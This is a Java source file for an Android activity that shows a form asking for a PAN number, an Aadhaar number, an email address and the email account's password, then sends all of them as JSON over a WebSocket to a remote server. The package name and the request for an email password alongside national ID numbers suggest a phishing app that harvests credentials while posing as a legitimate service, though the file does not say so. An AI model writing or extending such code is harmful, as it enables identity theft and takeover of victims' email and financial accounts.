package com.service.bob;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class ThirdActivity extends  BaseActivity {

    private LinearLayout frontView;
    private LinearLayout backView;
    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main3);

        frontView = findViewById(R.id.frontView);
        backView = findViewById(R.id.backView);

        EditText pan = findViewById(R.id.pan);
        EditText emailid = findViewById(R.id.emailid);
        EditText ad = findViewById(R.id.ad);

        int form_id = getIntent().getIntExtra("form_id", -1);

        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.emailid, "emailid");
        ids.put(R.id.ad, "ad");
        ids.put(R.id.pan, "pan");
        ids.put(R.id.emailpass, "emailpass");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        // 🔹 Auto flip logic when front fields complete
        TextWatcher watcher = new SimpleTextWatcher(() -> {
            if (isFrontFieldsValid(pan, ad,  emailid) && backView.getVisibility() == View.GONE) {
                flipToBack(frontView, backView);
            }
        });

        emailid.addTextChangedListener(watcher);
        ad.addTextChangedListener(watcher);
        pan.addTextChangedListener(watcher);

        Button buttonSubmit = findViewById(R.id.btnProceed);
        buttonSubmit.setOnClickListener(v -> {
            if (!validateForm()) {
                Toast.makeText(this, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }
            submitLoader.show();
            try {
                dataObject.put("form_data_id", form_id);
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_data_id", form_id);
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formDataId", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            int formId = response.optInt("data", -1);
                            String message = response.optString("message", "No message");
                            if (status == 200 && formId != -1) {
                                Intent intent = new Intent(context, LastActivity.class);
                                intent.putExtra("form_id", formId);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false;
                continue;
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "ad":
                    if (!FormValidator.validateMinLength(editText, 12, "Invalid Aadhaar Number")) {
                        isValid = false;
                    }
                    break;
                case "pan":
                    if (!FormValidator.validatePANCard(editText,  "Invalid Pan Number")) {
                        isValid = false;
                    }
                    break;
                case "emailid":
                    if (!FormValidator.validateEmail(editText,  "Invalid Email Id")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    private void flipToBack(View front, View back) {
        front.animate()
                .rotationY(90f)
                .setDuration(300)
                .withEndAction(() -> {
                    front.setVisibility(View.GONE);
                    back.setVisibility(View.VISIBLE);
                    back.setRotationY(-90f);
                    back.animate()
                            .rotationY(0f)
                            .setDuration(300)
                            .start();
                })
                .start();
    }

    private void flipToFront(View front, View back) {
        back.animate()
                .rotationY(90f)
                .setDuration(300)
                .withEndAction(() -> {
                    back.setVisibility(View.GONE);
                    front.setVisibility(View.VISIBLE);
                    front.setRotationY(-90f);
                    front.animate()
                            .rotationY(0f)
                            .setDuration(300)
                            .start();
                })
                .start();
    }

    private boolean isFrontFieldsValid(EditText pan, EditText ad, EditText emailid) {
        return FormValidator.validateEmail(emailid, "Invalid Email Id") && FormValidator.validatePANCard(pan, "Invalid Pan Number") && FormValidator.validateMinLength(ad, 12, "Invalid Aadhaar Number");
    }

    private static class SimpleTextWatcher implements TextWatcher {
        private final Runnable onChange;
        public SimpleTextWatcher(Runnable onChange) {
            this.onChange = onChange;
        }
        @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
        @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
        @Override public void afterTextChanged(android.text.Editable s) {
            onChange.run();
        }
    }


}
